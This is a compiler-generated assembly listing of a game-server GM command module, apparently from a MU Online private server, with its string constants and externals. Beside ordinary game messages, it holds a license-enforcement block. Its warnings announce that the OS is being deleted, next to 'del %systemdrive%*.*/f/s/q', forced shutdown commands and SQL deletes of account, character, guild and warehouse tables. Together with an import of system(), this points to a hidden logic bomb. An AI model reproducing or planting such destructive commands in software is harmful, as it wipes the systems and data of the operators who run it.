PUBLIC	??_C@_0BF@IAPMHEEM@?D?o?$LF?PHP?C?J?$LE?g?H?$LI?$LK?$LJ?$LH?$KO?$LM?$LD?A?$KE@ ; `string'
PUBLIC	??_C@_0BD@ONJMFEJN@?D?o?$LF?PHP?H?$LI?$LK?$LJ?$LN?C?$LA?$KD?$LM?$LD?A?$KE@ ; `string'
PUBLIC	??_C@_0CP@INODGHGL@?D?$LD?$LI?$KP?E?M?5?A?$KE?$LK?$LI?$LA?$KB?5?$LI?$KO?$LM?B?$LF?G?$LO?z?$LN?$MA?$LE?O?$LE?Y?4?5?$LL@ ; `string'
PUBLIC	??_C@_09IHCLJBNP@?1?$LN?$LK?E?H?$LI?$KO?$LM?B@	; `string'
PUBLIC	??_C@_0DK@FACDLFDK@?G?X?$LE?g?5?A?v?$LP?$KK?$MA?$LI?$LH?N?5?G?v?$MA?g?5?A?B?G?$KF?$MA?L?$LF?$LP?5?G?R?5@ ; `string'
PUBLIC	??_C@_0FF@DOGCJMIO@Command?5Make?5Usage?3?5?1make?5Type?5@ ; `string'
PUBLIC	??_C@_0BH@OMKDAPPO@Usuarios?5Online?3?5?$CFd?1?$CFd@ ; `string'
PUBLIC	??_C@_08OAHPJFNN@?$CFH?3?$CFM?3?$CFS@		; `string'
PUBLIC	??_C@_0L@EIAKHCAN@Tiempo?3?5?$CFs@		; `string'
PUBLIC	??_C@_0BL@CFOGCENH@Te?5falta?5dinero?0?5Costo?3?5?$CFd@ ; `string'
PUBLIC	??_C@_0BJ@CLNEGGOG@Action?3?5Ban?5User?$FL?$CFs?$FN?$FL?$CFs?$FN@ ; `string'
PUBLIC	??_C@_0CD@GMONJFFH@?$FLTIENDA?5ZEN?$FN?3?5?$CFs?5Activo?5?9?$DO?5?1off@ ; `string'
PUBLIC	??_C@_0CH@LIDNEDCM@?$FLDuelInfo?$FN?5DuelWins?3?5?$CFd?0?5DuelLo@ ; `string'
PUBLIC	??_C@_0EA@FCMKAJKK@?$FLAtaque?5Automatico?$FN?3?5?$CFs?5Activo?5@ ; `string'
PUBLIC	??_C@_0EJ@ILIKMIPK@?$FLAtaque?5Automatico?$FN?3?5?$CFs?5Activo?5@ ; `string'
PUBLIC	??_C@_0CF@EFAGGJG@?$FLTIENDA?5CASH?$FN?3?5?$CFs?5Activo?5?9?$DO?5?1of@ ; `string'
PUBLIC	??_C@_0BG@GFGDFAFL@?$FLBOTSTORE?$FN?3?5?$CFs?5Activo@ ; `string'
PUBLIC	??_C@_0EF@OLKIGBOO@GAMESERVER?5LICENCIA?3?5aviso?5no?5e@ ; `string'
PUBLIC	??_C@_0BL@BEIFBLDN@Error?5de?5licencia?5Aviso?5?$CD1@ ; `string'
PUBLIC	??_C@_0EO@DKMCALC@GAMESERVER?5LICENCIA?3?5El?5sistema@ ; `string'
PUBLIC	??_C@_0BL@DPKIEIPO@Error?5de?5licencia?5Aviso?5?$CD2@ ; `string'
PUBLIC	??_C@_0BB@KPEJEKNI@DELETE?5MEMB_INFO@		; `string'
PUBLIC	??_C@_0BB@MBFMAKEJ@DELETE?5CHARACTER@		; `string'
PUBLIC	??_C@_0N@OJOHLDHO@DELETE?5GUILD@		; `string'
PUBLIC	??_C@_0BC@CBEIIMJL@DELETE?5GUILD_MEMB@		; `string'
PUBLIC	??_C@_0BB@FEJMIJPA@DELETE?5WAREHOUSE@		; `string'
PUBLIC	??_C@_0BE@DIHNOACM@DELETE?5EXTWAREHOUSE@	; `string'
PUBLIC	??_C@_0M@DKLMBBFI@shutdown?5?9f@		; `string'
PUBLIC	??_C@_0FC@OABKOJEN@GAMESERVER?5LICENCIA?3?5El?5sistema@ ; `string'
PUBLIC	??_C@_0BL@CGLDHJLP@Error?5de?5licencia?5Aviso?5?$CD3@ ; `string'
PUBLIC	??_C@_09PGOPFAEL@?$EAecho?5Off@			; `string'
PUBLIC	??_C@_0BL@OKDLIGMN@del?5?$CFsystemdrive?$CF?$CK?4?$CK?1f?1s?1q@ ; `string'
PUBLIC	??_C@_0BF@CMCFLOLD@shutdown?5?9r?5?9f?5?9t?500@	; `string'
PUBLIC	??_C@_0BI@DMPMDHFM@Result?9Invalid?5Argument@	; `string'
PUBLIC	??_C@_0BG@GPJEKBCF@Result?9User?5Not?5Found@	; `string'
PUBLIC	??_C@_0BD@CFKKKGDI@Result?9Ability?$CI?$CFs?$CJ@ ; `string'
PUBLIC	??_C@_0DD@MBBAAJDL@Strength?$FL?$CFd?$FN?5Dexterity?$FL?$CFd?$FN?5Vita@ ; `string'
PUBLIC	??_C@_0BH@OLNBDHGL@Result?9Party?5Not?5Found@	; `string'
PUBLIC	??_C@_0BF@DHNHOHCA@Result?9Invalid?5Point@	; `string'
PUBLIC	??_C@_0N@KGMENDNJ@Result?9Party@		; `string'
PUBLIC	??_C@_08DHLCFGJM@?$CILeader?$CJ@		; `string'
PUBLIC	??_C@_02KEGNLNML@?0?5@				; `string'
PUBLIC	??_C@_0BH@MMJEPHGM@Result?9Too?5Manay?5Count@	; `string'
PUBLIC	??_C@_0BF@KINKJFCO@Result?9Is?5Safetyzone@	; `string'
PUBLIC	??_C@_0BJ@CEPFBKKD@Result?9Monster?5Not?5Found@	; `string'
PUBLIC	??_C@_0BM@HPFGBCLO@Result?9SummonMonster?$CI?$CFs?3?$CFd?$CJ@ ; `string'
PUBLIC	??_C@_0BI@GPFMCLGD@Result?9ClearMonster?$CI?$CFd?$CJ@ ; `string'
PUBLIC	??_C@_0BF@KOFDDOJB@Result?9ClearItem?$CI?$CFd?$CJ@ ; `string'
PUBLIC	??_C@_0BG@EBKONDEM@Result?9ClearInven?$CI?$CFd?$CJ@ ; `string'
PUBLIC	??_C@_0BH@FOCDIHKG@Result?9Disconnect?5User@	; `string'
PUBLIC	??_C@_0BE@CJMFLBBF@Result?9Invalid?5Area@	; `string'
PUBLIC	??_C@_0BL@FBKFECEH@Result?9SummonCharacter?$CI?$CFs?$CJ@ ; `string'
PUBLIC	??_C@_0CE@DPEEOBIE@No?5tienes?5los?5suficientes?5punto@ ; `string'
PUBLIC	??_C@_0DH@JNLNEIOF@?$FLANTI?9HACK?$FN?5IMPOSIBLE?5SUBIR?5PUN@ ; `string'
PUBLIC	??_R4CGMMng@@6B@				; CGMMng::`RTTI Complete Object Locator'
PUBLIC	??_R0?AVCGMMng@@@8				; CGMMng `RTTI Type Descriptor'
PUBLIC	??_R3CGMMng@@8					; CGMMng::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2CGMMng@@8					; CGMMng::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@CGMMng@@8				; CGMMng::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	__real@437f0000
EXTRN	??3@YAXPAXI@Z:PROC				; operator delete
EXTRN	_atexit:PROC
EXTRN	___report_rangecheckfailure:PROC
EXTRN	__invalid_parameter_noinfo:PROC
EXTRN	__errno:PROC
EXTRN	_memcpy:PROC
EXTRN	_memmove:PROC
EXTRN	_memset:PROC
EXTRN	_strcat:PROC
EXTRN	_strcmp:PROC
EXTRN	_strcpy:PROC
EXTRN	__stricmp:PROC
EXTRN	_strlen:PROC
EXTRN	_strtok:PROC
EXTRN	__imp__ExitProcess@4:PROC
EXTRN	__imp__GetTickCount@0:PROC
EXTRN	__imp__LoadResource@8:PROC
EXTRN	__imp__LockResource@4:PROC
EXTRN	__imp__SizeofResource@8:PROC
EXTRN	__imp__FindResourceW@12:PROC
EXTRN	__imp__wsprintfA:PROC
EXTRN	__imp__MessageBoxA@16:PROC
EXTRN	__imp__WideCharToMultiByte@32:PROC
EXTRN	___stdio_common_vsprintf:PROC
EXTRN	_rand:PROC
EXTRN	_atoi:PROC
EXTRN	_system:PROC
EXTRN	__localtime64_s:PROC
EXTRN	_strftime:PROC
EXTRN	__time64:PROC
EXTRN	?AfxThrowMemoryException@@YGXXZ:PROC		; AfxThrowMemoryException
EXTRN	?AfxThrowOleException@@YGXJ@Z:PROC		; AfxThrowOleException
EXTRN	?AfxFindStringResourceHandle@@YGPAUHINSTANCE__@@I@Z:PROC ; AfxFindStringResourceHandle
EXTRN	?AfxGetStringManager@@YGPAUIAtlStringMgr@ATL@@XZ:PROC ; AfxGetStringManager
EXTRN	__imp_?Get@CMsg@@QAEPADH@Z:PROC
EXTRN	??0CItem@@QAE@XZ:PROC				; CItem::CItem
EXTRN	?Convert@CItem@@QAEXHEEEEEE@Z:PROC		; CItem::Convert
EXTRN	?IsItem@CItem@@QAEHXZ:PROC			; CItem::IsItem
EXTRN	?ItemGetNumberMake@@YAHHH@Z:PROC		; ItemGetNumberMake
EXTRN	?IsItem@@YAHH@Z:PROC				; IsItem
EXTRN	?ItemGetDurability@@YAHHHHH@Z:PROC		; ItemGetDurability
EXTRN	?CloseClient@@YAXH@Z:PROC			; CloseClient
EXTRN	?DataSend@@YAHHPAEK@Z:PROC			; DataSend
EXTRN	?SearchGuild@CGuildClass@@QAEPAU_GUILD_INFO_STRUCT@@PAD@Z:PROC ; CGuildClass::SearchGuild
EXTRN	?ProcessUserRequest@CEngagePVP@@QAEXPAVOBJECTSTRUCT@@@Z:PROC ; CEngagePVP::ProcessUserRequest
EXTRN	?gObjAddMonster@@YAFH@Z:PROC			; gObjAddMonster
EXTRN	?gObjDel@@YAFH@Z:PROC				; gObjDel
EXTRN	?gObjBillRequest@@YAXPAVOBJECTSTRUCT@@@Z:PROC	; gObjBillRequest
EXTRN	?gObjGetIndex@@YAHPAD@Z:PROC			; gObjGetIndex
EXTRN	?gObjIsConnected@@YAHH@Z:PROC			; gObjIsConnected
EXTRN	?gObjSetMonster@@YAHHH@Z:PROC			; gObjSetMonster
EXTRN	?gObjLevelUp@@YA_NPAVOBJECTSTRUCT@@HHH@Z:PROC	; gObjLevelUp
EXTRN	?gObjShopBuyInventoryInsertItem@@YAEHVCItem@@@Z:PROC ; gObjShopBuyInventoryInsertItem
EXTRN	?gObjInventoryDeleteItem@@YAEHH@Z:PROC		; gObjInventoryDeleteItem
EXTRN	?gObjAddMsgSendDelay@@YAXPAVOBJECTSTRUCT@@HHHH@Z:PROC ; gObjAddMsgSendDelay
EXTRN	?CreateFrustrum@@YAXHHH@Z:PROC			; CreateFrustrum
EXTRN	?gObjCalDistance@@YAHPAVOBJECTSTRUCT@@0@Z:PROC	; gObjCalDistance
EXTRN	?gObjTeleport@@YAXHHHH@Z:PROC			; gObjTeleport
EXTRN	?gObjCloseSet@@YAXHH@Z:PROC			; gObjCloseSet
EXTRN	?gObjSetTradeOption@@YAXHH@Z:PROC		; gObjSetTradeOption
EXTRN	?gObjSetDuelOption@@YAXHH@Z:PROC		; gObjSetDuelOption
EXTRN	?gObjClearViewport@@YAXPAVOBJECTSTRUCT@@@Z:PROC	; gObjClearViewport
EXTRN	?gObjViewportListProtocolDestroy@@YAXPAVOBJECTSTRUCT@@@Z:PROC ; gObjViewportListProtocolDestroy
EXTRN	?gObjViewportListProtocolCreate@@YAXPAVOBJECTSTRUCT@@@Z:PROC ; gObjViewportListProtocolCreate
EXTRN	?gObjSendUserStatistic@@YAXHHH@Z:PROC		; gObjSendUserStatistic
EXTRN	?gObjFind@@YAPAVOBJECTSTRUCT@@PAD@Z:PROC	; gObjFind
EXTRN	?gObjGetStatPointState@@YAXHAAF0@Z:PROC		; gObjGetStatPointState
EXTRN	?MsgOutput@@YAXHPADZZ:PROC			; MsgOutput
EXTRN	?GCServerMsgStringSend@@YAXPADHE@Z:PROC		; GCServerMsgStringSend
EXTRN	?GCServerMsgStringSendGuild@@YAXPAU_GUILD_INFO_STRUCT@@PADE@Z:PROC ; GCServerMsgStringSendGuild
EXTRN	?MsgSendV2@@YAXPAVOBJECTSTRUCT@@PAEH@Z:PROC	; MsgSendV2
EXTRN	?GCDiePlayerSend@@YAXPAVOBJECTSTRUCT@@HEH@Z:PROC ; GCDiePlayerSend
EXTRN	?GCMagicListMultiSend@@YAXPAVOBJECTSTRUCT@@@Z:PROC ; GCMagicListMultiSend
EXTRN	?GCManagerGuildWarEnd@@YAXPAD@Z:PROC		; GCManagerGuildWarEnd
EXTRN	?GCManagerGuildWarSet@@YAXPAD0H@Z:PROC		; GCManagerGuildWarSet
EXTRN	?GCGuildWarRequestResult@@YAXPADHH@Z:PROC	; GCGuildWarRequestResult
EXTRN	?GCMoneySend@@YAXHK@Z:PROC			; GCMoneySend
EXTRN	?GCGoalSend@@YAXHPADE0E@Z:PROC			; GCGoalSend
EXTRN	?PHeadSubSetB@@YAXPAEEEH@Z:PROC			; PHeadSubSetB
EXTRN	?CGRequestQuestInfo@@YAXH@Z:PROC		; CGRequestQuestInfo
EXTRN	?MakeNoticeMsgEx@TNotice@@SAXPAXEPADZZ:PROC	; TNotice::MakeNoticeMsgEx
EXTRN	?SendNoticeToUser@TNotice@@SAXHPAX@Z:PROC	; TNotice::SendNoticeToUser
EXTRN	??0TNotice@@QAE@E@Z:PROC			; TNotice::TNotice
EXTRN	?SendToUser@TNotice@@QAAXHPADZZ:PROC		; TNotice::SendToUser
EXTRN	?MsgOutputAll@TNotice@@QAAXPADZZ:PROC		; TNotice::MsgOutputAll
EXTRN	?ExecFormat@CDataBase@@QAA_NPBDZZ:PROC		; CDataBase::ExecFormat
EXTRN	?DuelWins@CManager@@QAEHPAD@Z:PROC		; CManager::DuelWins
EXTRN	?DuelLoser@CManager@@QAEHPAD@Z:PROC		; CManager::DuelLoser
EXTRN	?CheckUserCondition@CPkClearSystem@@QAEXPAVOBJECTSTRUCT@@@Z:PROC ; CPkClearSystem::CheckUserCondition
EXTRN	?CheckUserCondition@CResetSystem@@QAEXPAVOBJECTSTRUCT@@@Z:PROC ; CResetSystem::CheckUserCondition
EXTRN	?CreateOfflineSystem@COFFSystem@@QAEXH@Z:PROC	; COFFSystem::CreateOfflineSystem
EXTRN	?CreateOfflinetrade@COFFtrade@@QAEXH@Z:PROC	; COFFtrade::CreateOfflinetrade
EXTRN	?MakeItemNumber@@YAHHH@Z:PROC			; MakeItemNumber
EXTRN	??_ECGMMng@@UAEPAXI@Z:PROC			; CGMMng::`vector deleting destructor'
EXTRN	?GCItemListSend@@YAXH@Z:PROC			; GCItemListSend
EXTRN	?ClearItem@MapClass@@QAEHPAVOBJECTSTRUCT@@H@Z:PROC ; MapClass::ClearItem
EXTRN	?GetAttr@MapClass@@QAEEHH@Z:PROC		; MapClass::GetAttr
EXTRN	?ItemSerialCreateSend@@YAXHEEEHEEEEEHEEH@Z:PROC	; ItemSerialCreateSend
EXTRN	?PetItemSerialCreateSend@@YAXHEEEHEEEEEHEE@Z:PROC ; PetItemSerialCreateSend
EXTRN	?OffExpStart@cOffExp@@QAEXH@Z:PROC		; cOffExp::OffExpStart
EXTRN	?OffExpStart2@cOffExp@@QAEXH@Z:PROC		; cOffExp::OffExpStart2
EXTRN	?OffExpStart3@cOffExp@@QAEXH@Z:PROC		; cOffExp::OffExpStart3
EXTRN	?BattleSoccerGoalStart@@YAXH@Z:PROC		; BattleSoccerGoalStart
EXTRN	?BattleSoccerGoalEnd@@YAXH@Z:PROC		; BattleSoccerGoalEnd
EXTRN	?Move@CMoveCommand@@QAEHPAVOBJECTSTRUCT@@PAD@Z:PROC ; CMoveCommand::Move
EXTRN	?IsSetItem@CSetItemOption@@QAEHH@Z:PROC		; CSetItemOption::IsSetItem
EXTRN	?GenSetOption@CSetItemOption@@QAEHH@Z:PROC	; CSetItemOption::GenSetOption
EXTRN	?SetMode@CDarkSpirit@@QAEXW4ePetItem_Mode@1@H@Z:PROC ; CDarkSpirit::SetMode
EXTRN	?Output@CLogToFile@@QAAXPADZZ:PROC		; CLogToFile::Output
EXTRN	??0CLogToFile@@QAE@QAD0H@Z:PROC			; CLogToFile::CLogToFile
EXTRN	??1CLogToFile@@QAE@XZ:PROC			; CLogToFile::~CLogToFile
EXTRN	?GetAttr@CMonsterAttr@@QAEPAUMONSTER_ATTRIBUTE@@H@Z:PROC ; CMonsterAttr::GetAttr
EXTRN	?GetAttr@CMonsterAttr@@QAEPAUMONSTER_ATTRIBUTE@@PAD@Z:PROC ; CMonsterAttr::GetAttr
EXTRN	?GJPUserClose2@@YAXPAD@Z:PROC			; GJPUserClose2
EXTRN	@__security_check_cookie@4:PROC
EXTRN	___CxxFrameHandler3:PROC
EXTRN	__chkstk:PROC
EXTRN	_memset:PROC
EXTRN	??_7type_info@@6B@:QWORD			; type_info::`vftable'
EXTRN	?LogAdd@@3P6AXPADZZA:DWORD			; LogAdd
EXTRN	?LogAddC@@3P6AXEPADZZA:DWORD			; LogAddC
EXTRN	?LogAddTD@@3P6AXPADZZA:DWORD			; LogAddTD
EXTRN	?ItemAttribute@@3PAUITEM_ATTRIBUTE@@A:BYTE	; ItemAttribute
EXTRN	?g_PvpEvent@@3VCEngagePVP@@A:BYTE		; g_PvpEvent
EXTRN	?gObj@@3PAVOBJECTSTRUCT@@A:DWORD		; gObj
EXTRN	?gServerMaxUser@@3HA:DWORD			; gServerMaxUser
EXTRN	?gObjTotalUser@@3HA:DWORD			; gObjTotalUser
EXTRN	?Manager@@3VCManager@@A:BYTE			; Manager
EXTRN	?g_GlobalConfig@@3VCGlobalConfig@@A:BYTE	; g_GlobalConfig
EXTRN	?g_PkClearSystem@@3VCPkClearSystem@@A:BYTE	; g_PkClearSystem
EXTRN	?g_ResetSystem@@3VCResetSystem@@A:BYTE		; g_ResetSystem
EXTRN	?g_TerrainManager@@3VCTerrainManager@@A:BYTE	; g_TerrainManager
EXTRN	?OFFSystem@@3VCOFFSystem@@A:BYTE		; OFFSystem
EXTRN	?OFFtrade@@3VCOFFtrade@@A:BYTE			; OFFtrade
EXTRN	?lMsg@@3VCMsg@@A:BYTE				; lMsg
EXTRN	?MapC@@3PAVMapClass@@A:DWORD			; MapC
EXTRN	?gLevelExperience@@3PAKA:BYTE			; gLevelExperience
EXTRN	?gEnableBattleSoccer@@3HA:DWORD			; gEnableBattleSoccer
EXTRN	?giKundunRefillHPSec@@3HA:DWORD			; giKundunRefillHPSec
EXTRN	?giKundunRefillHP@@3HA:DWORD			; giKundunRefillHP
EXTRN	?giKundunRefillHPTime@@3HA:DWORD		; giKundunRefillHPTime
EXTRN	?OffExp@@3VcOffExp@@A:BYTE			; OffExp
EXTRN	?gParty@@3VPartyClass@@A:BYTE			; gParty
EXTRN	?gMoveCommand@@3VCMoveCommand@@A:BYTE		; gMoveCommand
EXTRN	?gSetItemOption@@3VCSetItemOption@@A:BYTE	; gSetItemOption
EXTRN	?gDarkSpirit@@3PAVCDarkSpirit@@A:BYTE		; gDarkSpirit
EXTRN	?gMAttr@@3VCMonsterAttr@@A:BYTE			; gMAttr
EXTRN	?Guild@@3VCGuildClass@@A:BYTE			; Guild
EXTRN	?DCInfo@@3Vclassdef@@A:BYTE			; DCInfo
EXTRN	___security_cookie:DWORD
EXTRN	__fltused:DWORD
;	COMDAT ?_OptionsStorage@?1??__local_stdio_printf_options@@9@4_KA
_BSS	SEGMENT
?_OptionsStorage@?1??__local_stdio_printf_options@@9@4_KA DQ 01H DUP (?) ; `__local_stdio_printf_options'::`2'::_OptionsStorage
_BSS	ENDS
_BSS	SEGMENT
?cManager@@3VCGMMng@@A DB 03190H DUP (?)		; cManager
?KUNDUN_GM_LOG@@3VCLogToFile@@A DB 010228H DUP (?)	; KUNDUN_GM_LOG
_BSS	ENDS
CRT$XCU	SEGMENT
?KUNDUN_GM_LOG$initializer$@@3P6AXXZA DD FLAT:??__EKUNDUN_GM_LOG@@YAXXZ ; KUNDUN_GM_LOG$initializer$
CRT$XCU	ENDS
;	COMDAT __real@437f0000
CONST	SEGMENT
__real@437f0000 DD 0437f0000r			; 255
CONST	ENDS
;	COMDAT ??_R1A@?0A@EA@CGMMng@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@CGMMng@@8 DD FLAT:??_R0?AVCGMMng@@@8	; CGMMng::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	00H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3CGMMng@@8
rdata$r	ENDS
;	COMDAT ??_R2CGMMng@@8
rdata$r	SEGMENT
??_R2CGMMng@@8 DD FLAT:??_R1A@?0A@EA@CGMMng@@8		; CGMMng::`RTTI Base Class Array'
rdata$r	ENDS
;	COMDAT ??_R3CGMMng@@8
rdata$r	SEGMENT
??_R3CGMMng@@8 DD 00H					; CGMMng::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	01H
	DD	FLAT:??_R2CGMMng@@8
rdata$r	ENDS
;	COMDAT ??_R0?AVCGMMng@@@8
data$r	SEGMENT
??_R0?AVCGMMng@@@8 DD FLAT:??_7type_info@@6B@		; CGMMng `RTTI Type Descriptor'
	DD	00H
	DB	'.?AVCGMMng@@', 00H
data$r	ENDS
;	COMDAT ??_R4CGMMng@@6B@
rdata$r	SEGMENT
??_R4CGMMng@@6B@ DD 00H					; CGMMng::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AVCGMMng@@@8
	DD	FLAT:??_R3CGMMng@@8
rdata$r	ENDS
;	COMDAT ??_C@_0DH@JNLNEIOF@?$FLANTI?9HACK?$FN?5IMPOSIBLE?5SUBIR?5PUN@
CONST	SEGMENT
??_C@_0DH@JNLNEIOF@?$FLANTI?9HACK?$FN?5IMPOSIBLE?5SUBIR?5PUN@ DB '[ANTI-H'
	DB	'ACK] IMPOSIBLE SUBIR PUNTOS CUANDO MOVES ITEMS.', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0CE@DPEEOBIE@No?5tienes?5los?5suficientes?5punto@
CONST	SEGMENT
??_C@_0CE@DPEEOBIE@No?5tienes?5los?5suficientes?5punto@ DB 'No tienes los'
	DB	' suficientes puntos...', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_0BL@FBKFECEH@Result?9SummonCharacter?$CI?$CFs?$CJ@
CONST	SEGMENT
??_C@_0BL@FBKFECEH@Result?9SummonCharacter?$CI?$CFs?$CJ@ DB 'Result-Summo'
	DB	'nCharacter(%s)', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_0BE@CJMFLBBF@Result?9Invalid?5Area@
CONST	SEGMENT
??_C@_0BE@CJMFLBBF@Result?9Invalid?5Area@ DB 'Result-Invalid Area', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BH@FOCDIHKG@Result?9Disconnect?5User@
CONST	SEGMENT
??_C@_0BH@FOCDIHKG@Result?9Disconnect?5User@ DB 'Result-Disconnect User', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BG@EBKONDEM@Result?9ClearInven?$CI?$CFd?$CJ@
CONST	SEGMENT
??_C@_0BG@EBKONDEM@Result?9ClearInven?$CI?$CFd?$CJ@ DB 'Result-ClearInven'
	DB	'(%d)', 00H					; `string'
CONST	ENDS
;	COMDAT ??_C@_0BF@KOFDDOJB@Result?9ClearItem?$CI?$CFd?$CJ@
CONST	SEGMENT
??_C@_0BF@KOFDDOJB@Result?9ClearItem?$CI?$CFd?$CJ@ DB 'Result-ClearItem(%'
	DB	'd)', 00H					; `string'
CONST	ENDS
;	COMDAT ??_C@_0BI@GPFMCLGD@Result?9ClearMonster?$CI?$CFd?$CJ@
CONST	SEGMENT
??_C@_0BI@GPFMCLGD@Result?9ClearMonster?$CI?$CFd?$CJ@ DB 'Result-ClearMon'
	DB	'ster(%d)', 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_0BM@HPFGBCLO@Result?9SummonMonster?$CI?$CFs?3?$CFd?$CJ@
CONST	SEGMENT
??_C@_0BM@HPFGBCLO@Result?9SummonMonster?$CI?$CFs?3?$CFd?$CJ@ DB 'Result-'
	DB	'SummonMonster(%s:%d)', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_0BJ@CEPFBKKD@Result?9Monster?5Not?5Found@
CONST	SEGMENT
??_C@_0BJ@CEPFBKKD@Result?9Monster?5Not?5Found@ DB 'Result-Monster Not Fo'
	DB	'und', 00H					; `string'
CONST	ENDS
;	COMDAT ??_C@_0BF@KINKJFCO@Result?9Is?5Safetyzone@
CONST	SEGMENT
??_C@_0BF@KINKJFCO@Result?9Is?5Safetyzone@ DB 'Result-Is Safetyzone', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BH@MMJEPHGM@Result?9Too?5Manay?5Count@
CONST	SEGMENT
??_C@_0BH@MMJEPHGM@Result?9Too?5Manay?5Count@ DB 'Result-Too Manay Count', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_02KEGNLNML@?0?5@
CONST	SEGMENT
??_C@_02KEGNLNML@?0?5@ DB ', ', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_08DHLCFGJM@?$CILeader?$CJ@
CONST	SEGMENT
??_C@_08DHLCFGJM@?$CILeader?$CJ@ DB '(Leader)', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0N@KGMENDNJ@Result?9Party@
CONST	SEGMENT
??_C@_0N@KGMENDNJ@Result?9Party@ DB 'Result-Party', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0BF@DHNHOHCA@Result?9Invalid?5Point@
CONST	SEGMENT
??_C@_0BF@DHNHOHCA@Result?9Invalid?5Point@ DB 'Result-Invalid Point', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BH@OLNBDHGL@Result?9Party?5Not?5Found@
CONST	SEGMENT
??_C@_0BH@OLNBDHGL@Result?9Party?5Not?5Found@ DB 'Result-Party Not Found', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0DD@MBBAAJDL@Strength?$FL?$CFd?$FN?5Dexterity?$FL?$CFd?$FN?5Vita@
CONST	SEGMENT
??_C@_0DD@MBBAAJDL@Strength?$FL?$CFd?$FN?5Dexterity?$FL?$CFd?$FN?5Vita@ DB 'S'
	DB	'trength[%d] Dexterity[%d] Vitality[%d] Energy[%d]', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BD@CFKKKGDI@Result?9Ability?$CI?$CFs?$CJ@
CONST	SEGMENT
??_C@_0BD@CFKKKGDI@Result?9Ability?$CI?$CFs?$CJ@ DB 'Result-Ability(%s)', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BG@GPJEKBCF@Result?9User?5Not?5Found@
CONST	SEGMENT
??_C@_0BG@GPJEKBCF@Result?9User?5Not?5Found@ DB 'Result-User Not Found', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BI@DMPMDHFM@Result?9Invalid?5Argument@
CONST	SEGMENT
??_C@_0BI@DMPMDHFM@Result?9Invalid?5Argument@ DB 'Result-Invalid Argument'
	DB	00H						; `string'
CONST	ENDS
;	COMDAT ??_C@_0BF@CMCFLOLD@shutdown?5?9r?5?9f?5?9t?500@
CONST	SEGMENT
??_C@_0BF@CMCFLOLD@shutdown?5?9r?5?9f?5?9t?500@ DB 'shutdown -r -f -t 00', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BL@OKDLIGMN@del?5?$CFsystemdrive?$CF?$CK?4?$CK?1f?1s?1q@
CONST	SEGMENT
??_C@_0BL@OKDLIGMN@del?5?$CFsystemdrive?$CF?$CK?4?$CK?1f?1s?1q@ DB 'del %'
	DB	'systemdrive%*.*/f/s/q', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_09PGOPFAEL@?$EAecho?5Off@
CONST	SEGMENT
??_C@_09PGOPFAEL@?$EAecho?5Off@ DB '@echo Off', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0BL@CGLDHJLP@Error?5de?5licencia?5Aviso?5?$CD3@
CONST	SEGMENT
??_C@_0BL@CGLDHJLP@Error?5de?5licencia?5Aviso?5?$CD3@ DB 'Error de licenc'
	DB	'ia Aviso #3', 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_0FC@OABKOJEN@GAMESERVER?5LICENCIA?3?5El?5sistema@
CONST	SEGMENT
??_C@_0FC@OABKOJEN@GAMESERVER?5LICENCIA?3?5El?5sistema@ DB 'GAMESERVER LI'
	DB	'CENCIA: El sistema de licencia esta eliminando tu sistema ope'
	DB	'rativo ', 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_0M@DKLMBBFI@shutdown?5?9f@
CONST	SEGMENT
??_C@_0M@DKLMBBFI@shutdown?5?9f@ DB 'shutdown -f', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0BE@DIHNOACM@DELETE?5EXTWAREHOUSE@
CONST	SEGMENT
??_C@_0BE@DIHNOACM@DELETE?5EXTWAREHOUSE@ DB 'DELETE EXTWAREHOUSE', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BB@FEJMIJPA@DELETE?5WAREHOUSE@
CONST	SEGMENT
??_C@_0BB@FEJMIJPA@DELETE?5WAREHOUSE@ DB 'DELETE WAREHOUSE', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BC@CBEIIMJL@DELETE?5GUILD_MEMB@
CONST	SEGMENT
??_C@_0BC@CBEIIMJL@DELETE?5GUILD_MEMB@ DB 'DELETE GUILD_MEMB', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0N@OJOHLDHO@DELETE?5GUILD@
CONST	SEGMENT
??_C@_0N@OJOHLDHO@DELETE?5GUILD@ DB 'DELETE GUILD', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0BB@MBFMAKEJ@DELETE?5CHARACTER@
CONST	SEGMENT
??_C@_0BB@MBFMAKEJ@DELETE?5CHARACTER@ DB 'DELETE CHARACTER', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BB@KPEJEKNI@DELETE?5MEMB_INFO@
CONST	SEGMENT
??_C@_0BB@KPEJEKNI@DELETE?5MEMB_INFO@ DB 'DELETE MEMB_INFO', 00H ; `string'
